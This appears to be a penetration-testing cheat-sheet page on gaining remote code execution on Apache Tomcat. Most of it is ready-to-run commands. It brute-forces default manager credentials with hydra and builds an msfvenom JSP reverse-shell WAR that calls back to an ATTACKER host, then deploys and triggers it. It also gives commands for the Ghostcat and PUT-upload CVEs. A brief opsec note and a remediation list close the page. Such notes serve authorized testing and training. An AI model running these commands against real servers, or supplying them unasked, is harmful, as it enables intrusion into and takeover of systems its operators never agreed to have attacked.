---
tags:
  - Web
---

# :material-cat: Apache Tomcat

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

Tomcat serves Java web apps. The **Manager app** deploys WAR files — so valid
manager creds (often defaults) mean a shell. Also watch for the path-traversal and
deserialization CVEs.

!!! abstract "TL;DR"
    Find `/manager/html` → try default creds (`tomcat:tomcat`, `admin:admin`) →
    deploy a JSP webshell WAR → RCE. No manager? Check `CVE-2020-1938` (Ghostcat)
    and `CVE-2017-12617` (PUT JSP).

## :material-magnify: Identify

```bash
curl -sI http://$TARGET:8080/ | grep -i coyote        # Server: Apache-Coyote
curl -s http://$TARGET:8080/manager/html              # 401 = manager present
# default paths: /manager/html /host-manager/html /manager/status
```

## :material-key: Default creds

```bash
# Tomcat ships with well-known defaults; brute the manager
hydra -L users.txt -P pass.txt -f http-get://$TARGET:8080/manager/html
# classic combos: tomcat:tomcat  admin:admin  tomcat:s3cret  admin:<blank>
nmap -p8080 --script http-tomcat-default-users $TARGET
```

## :material-fire: Manager → WAR → shell

```bash
# Build a JSP reverse-shell WAR
msfvenom -p java/jsp_shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f war -o shell.war
# Deploy via the manager API
curl -u tomcat:tomcat -T shell.war "http://$TARGET:8080/manager/text/deploy?path=/shell"
# Trigger it
curl "http://$TARGET:8080/shell/"
```

## :material-alert: CVEs when the manager is closed

```bash
# Ghostcat — CVE-2020-1938: read/JSP-include via the AJP connector (8009)
nmap -p8009 --script ajp-request $TARGET
# tomcat with PUT enabled — CVE-2017-12617: upload a JSP directly
curl -X PUT http://$TARGET:8080/shell.jsp/ --data-binary @shell.jsp
```

!!! opsec "Deployed apps and WARs are logged"
    Manager deploys leave access-log entries and a WAR on disk. Undeploy and clean
    up on real engagements; note the artifact in your report.

## :material-shield-check: Remediation

- Change/disable default manager accounts; restrict `/manager` by IP; disable the
  AJP connector if unused; patch Tomcat.

## :material-link-variant: Related

- Fingerprinted at [Web Technologies](index.md) / [Ports](../network/ports.md).
- Shell → [Linux Privesc](../privesc/linux.md); WAR/JSP upload overlaps [File Upload](../web/file-upload.md).
- Reference: [HackTricks Tomcat](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/tomcat/index.html).
